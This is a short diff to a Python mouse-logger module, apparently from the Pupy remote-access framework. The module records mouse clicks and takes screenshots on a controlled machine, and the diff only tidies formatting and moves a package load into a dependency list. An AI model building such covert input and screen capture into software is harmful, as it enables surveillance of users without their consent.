@@ -1,4 +1,4 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # All rights reserved.
 
@@ -26,8 +26,9 @@ class MouseLoggerModule(PupyModule):
     """ log mouse clicks and take screenshots of areas around it """
     # WARNING : screenshots are kept in memory before beeing dumped
     #TODO change that and add a callback to automatically send back screenshots without need for dumping
-    daemon=True
-    unique_instance=True
+    daemon = True
+    unique_instance = True
+    dependencies = [ 'pupwinutils.mouselogger' ]
 
     def __init__(self, *args, **kwargs):
         PupyModule.__init__(self, *args, **kwargs)
@@ -39,14 +40,13 @@ class MouseLoggerModule(PupyModule):
 
     def stop_daemon(self):
         self.success("mouselogger stopped")
-        
+
     def run(self, args):
         try:
             os.makedirs(os.path.join("data","mouselogger"))
         except Exception:
             pass
         if args.action=="start":
-            self.client.load_package("pupwinutils.mouselogger")
             if self.mouselogger:
                 self.error("the mouselogger is already started")
             else:
@@ -76,6 +76,3 @@ class MouseLoggerModule(PupyModule):
             elif args.action=="stop":
                 self.mouselogger.stop()
                 self.job.stop()
-
-
-
